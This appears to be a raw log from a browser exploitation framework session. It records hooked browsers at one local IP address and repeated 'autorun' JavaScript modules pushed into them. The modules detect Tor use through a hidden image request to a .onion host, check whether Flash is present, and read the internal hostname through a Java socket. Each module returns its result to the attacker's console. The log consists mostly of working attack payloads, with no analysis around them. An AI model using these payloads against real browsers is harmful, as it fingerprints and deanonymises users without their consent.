[14/06/15 17:37:19 192.168.1.112] 192.168.1.112
[14/06/15 17:37:19 192.168.1.112] Firefox 10.0.1 - Mozilla/5.0 (Windows NT 6.1
[14/06/15 17:37:19 192.168.1.112] Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1
[14/06/15 17:39:34 192.168.1.112] 192.168.1.112
[14/06/15 17:39:34 192.168.1.112] Firefox 10.0.1 - Mozilla/5.0 (Windows NT 6.1
[14/06/15 17:39:34 192.168.1.112] Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1
[14/06/15 17:40:51 192.168.1.112] 192.168.1.112
[14/06/15 17:40:51 192.168.1.112] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
[14/06/15 17:40:51 192.168.1.112] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
[14/06/15 17:40:54 192.168.1.112] 192.168.1.112
[14/06/15 17:40:54 192.168.1.112] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
[14/06/15 17:40:54 192.168.1.112] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
[14/06/15 17:40:57 192.168.1.112] 192.168.1.112
[14/06/15 17:40:57 192.168.1.112] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
[14/06/15 17:40:57 192.168.1.112] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
[14/06/15 17:41:18 192.168.1.112] 192.168.1.112
[14/06/15 17:41:18 192.168.1.112] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
[14/06/15 17:41:18 192.168.1.112] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
[14/06/15 17:50:09 192.168.1.112] 192.168.1.112
[14/06/15 17:50:09 192.168.1.112] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
[14/06/15 17:50:09 192.168.1.112] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
[14/06/15 17:50:22 192.168.1.112] 192.168.1.112
[14/06/15 17:50:22 192.168.1.112] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
[14/06/15 17:50:22 192.168.1.112] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
[14/06/15 17:51:58 192.168.1.112] Autorun set with code:
function using_tor() {
	result = "Tor is being used";
}
function not_using_tor() {
	result = "Tor is NOT being used";
}
function do_main() {
	var img = new Image();

    img.onload = using_tor();
	img.onerror = not_using_tor();
	img.setAttribute("width", "0");
    img.setAttribute("height", "0");
	img.setAttribute("style", "visibility:hidden;");
	img.src = 'http://dige6xxwpt2knqbv.onion/wink.gif';

	document.body.appendChild(img);

    return "Request Sent";
}

var result = null;
do_main();

return_result(result_id, result);

[14/06/15 17:53:24 192.168.1.112] Autorun set with code:
function using_tor() {
	result = "Tor is being used";
}
function not_using_tor() {
	result = "Tor is NOT being used";
}
function do_main() {
	var img = new Image();

    img.onload = using_tor();
	img.onerror = not_using_tor();
	img.setAttribute("width", "0");
    img.setAttribute("height", "0");
	img.setAttribute("style", "visibility:hidden;");
	img.src = 'http://dige6xxwpt2knqbv.onion/wink.gif';

	document.body.appendChild(img);

    return "Request Sent";
}

var result = null;
do_main();

return_result(result_id, result);

[14/06/15 17:53:25 192.168.1.112] Autorun set with code:
function using_tor() {
	result = "Tor is being used";
}
function not_using_tor() {
	result = "Tor is NOT being used";
}
function do_main() {
	var img = new Image();

    img.onload = using_tor();
	img.onerror = not_using_tor();
	img.setAttribute("width", "0");
    img.setAttribute("height", "0");
	img.setAttribute("style", "visibility:hidden;");
	img.src = 'http://dige6xxwpt2knqbv.onion/wink.gif';

	document.body.appendChild(img);

    return "Request Sent";
}

var result = null;
do_main();

return_result(result_id, result);

[14/06/15 18:00:41 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:42 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:43 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:43 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:47 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:47 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:47 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:48 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:48 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:49 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:51 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:51 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:51 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:00:53 192.168.1.112] Autorun set with code:
function do_main(){	
	
	if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) {
		result = "Flash is available in browser";
	} else {
		result = "Flash is NOT available in browser";
	}
}

var result = null;
do_main();

return_result(result_id, result);
[14/06/15 18:13:35 192.168.1.112] 192.168.1.112
[14/06/15 18:13:35 192.168.1.112] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
[14/06/15 18:13:35 192.168.1.112] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
[14/06/15 18:14:02 192.168.1.112] 192.168.1.112
[14/06/15 18:14:02 192.168.1.112] Firefox 10.0.1 - Mozilla/5.0 (Windows NT 6.1
[14/06/15 18:14:02 192.168.1.112] Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1
[14/06/15 18:15:23 192.168.1.112] Autorun set with code:
// code from http://code.google.com/p/attackapi/

var internalhostname = "";

function do_main(){
	
	try {
		var sock = new java.net.Socket();
		
		sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
		sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
		
		internalhostname =  sock.getLocalAddress().getHostName();
	} catch (e) {
		internalhostname = 'failed';	
	}

}

do_main();
return_result(result_id, internalhostname);
[14/06/15 18:22:35 192.168.1.112] Autorun set with code:
// code from http://code.google.com/p/attackapi/

var internalhostname = "";

function do_main(){
	
	try {
		var sock = new java.net.Socket();
		
		sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
		sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
		
		internalhostname =  sock.getLocalAddress().getHostName();
	} catch (e) {
		internalhostname = 'failed';	
	}

}

do_main();
return_result(result_id, internalhostname);
[14/06/15 18:22:36 192.168.1.112] Autorun set with code:
// code from http://code.google.com/p/attackapi/

var internalhostname = "";

function do_main(){
	
	try {
		var sock = new java.net.Socket();
		
		sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
		sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
		
		internalhostname =  sock.getLocalAddress().getHostName();
	} catch (e) {
		internalhostname = 'failed';	
	}

}

do_main();
return_result(result_id, internalhostname);
